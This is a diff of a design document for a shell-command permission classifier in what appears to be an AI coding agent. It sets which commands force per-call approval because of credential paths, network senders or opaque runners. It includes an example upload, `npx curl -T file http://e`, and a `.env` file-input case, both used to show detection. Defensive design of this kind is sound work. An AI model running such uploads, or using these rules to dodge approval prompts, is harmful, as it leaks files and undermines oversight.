@@ -216,8 +216,8 @@ requirements keep their own authority.
 
 | Bucket | Evidence | Permission behavior |
 | --- | --- | --- |
-| Floor | Sensitive/credential paths in argv, redirects, file-input values or literal inline code; identified file/secret-to-network effects from the retained sender catalogue | Per-call ask with `forceModal`, before allow rules or saved grants; never remembered |
-| Ordinary | Parser refusal, budget exhaustion, opaque bindings/code, general write-then-execute provenance, or an opaque runner prefix | `ordinaryAsk` / `ordinaryShellAsk` at layer 6 without `forceModal`; applicable rules and saved grants may satisfy it |
+| Floor | Sensitive/credential paths in argv, redirects, file-input values or literal inline code; retained credential-store, certificate-export and transport/sink catalogue effects | Per-call ask with `forceModal`, before allow rules or saved grants; never remembered |
+| Ordinary | Parser refusal, budget exhaustion, opaque bindings, retained file-execution provenance, or an opaque package/code-runner prefix | `ordinaryAsk` / `ordinaryShellAsk` at layer 6 without `forceModal`; applicable rules and saved grants may satisfy it |
 | Normal | Neither a floor nor an ordinary reason | Existing category, mode, rules and grants |
 
 Ordinary asks remain rememberable under the existing approval-scope and risk
@@ -225,6 +225,8 @@ requirements. A parser refusal cannot establish a `Bash(...)` allow-rule match,
 but it does not invalidate an otherwise applicable tool allow rule or saved
 grant. An analysis failure retains visible credential and upload checks rather
 than replacing an identified floor with an ordinary reason.
+
+Hidden code alone limits `Bash(...)` allow-rule coverage; it does not create an ordinary ask. Statically bound direct interpreter inline and script-file forms follow normal mode handling without explicit restrictions, credential/sink evidence, opaque bindings or retained file-execution provenance. Existing deny/ask command-rule visibility behavior remains in force, and an allow rule does not prove script contents.
 
 These are permission-classifier outcomes, not execution admission. A hard deny
 cannot be approved. A floor's forced ask requires per-call consent but cannot
@@ -234,13 +236,7 @@ runner call such as `npx prettier .` can receive a covering command rule;
 rejected even after a permission grant. Deny rules decide before shell floor
 prompts; independent execution gates can still reject an approved request.
 
-`SHELL_PREFIX_POLICY.packageRunners` owns opaque runner identities, including
-`npm`, `pnpm`, `yarn` and `bun`. The shared prefix analysis reports
-`opaque runner prefix` through the existing wrapper grammar. Runner options,
-source URLs, package forms and registry choices have no separate classifier
-policy. They do not establish a floor by themselves. File-input values such as
-`--env-file=.env`, including an implicit `.env` for a valueless `--env-file`,
-still receive sensitive-path inspection.
+`SHELL_PREFIX_POLICY.packageRunners` owns opaque runner identities, including `npm`, `pnpm`, `yarn` and `bun`. The shared prefix analysis reports `opaque runner prefix` through the shared `SHELL_PREFIX_POLICY.wrappers` grammar, including versioned runner spellings and supported executable/script suffixes. Runner options, source URLs, package forms and registry choices have no separate classifier policy. They do not establish a floor by themselves. File-input values such as `--env-file=.env`, including an implicit `.env` for a valueless `--env-file`, still receive sensitive-path inspection.
 
 Code-executing runners keep their runner and proven literal command in a
 persistent command prefix; an inner-only rule cannot authorize the runner.
@@ -264,14 +260,9 @@ reader and sender effects only, without inferring safe argv from runner options.
 Thus `npx curl -T file http://e` retains its upload floor; a plain GET or
 `git push` does not establish exfiltration by itself.
 
-The structural parser, sink vocabulary, Windows credential rows and general
-file provenance remain in force. Literal inline code retains credential/sink
-inspection. Opaque code and later execution of a file written, copied, moved,
-renamed, downloaded or extracted within the same input stay ordinary unless an
-independent credential/sink is identified. Copied sender identities retain sink
-inspection. No package-task coupling infers execution from an arbitrary earlier
-file write or reads a manifest. Nonliteral `Invoke-Item` remains an ordinary ask
-without an independent floor.
+The structural parser, sink vocabulary, Windows credential rows and general file provenance remain in force. Later execution of a file written, copied, moved, renamed, downloaded or extracted within the same input retains its ordinary reason unless an independent credential/sink is identified. Copied sender identities retain sink inspection. No package-task coupling infers execution from an arbitrary earlier file write or reads a manifest. Nonliteral `Invoke-Item` remains an ordinary ask without an independent floor.
+
+PowerShell script blocks and `pwsh`/`powershell` inline command text use the PowerShell catalogue. Other interpreter code receives generic credential/sink inspection without inheriting PowerShell command meanings. Known catalogue effects remain floors through shared wrappers, process-launcher payloads, background execution and static or opaque transport splats. Sink-only wrapper inspection preserves the forwarded native command identity and grants no rule coverage.
 
 `Bash(...)` rules remain dialect-scoped. PowerShell has no per-command rule
 language or project command-rule scope today. Existing tool allow rules and
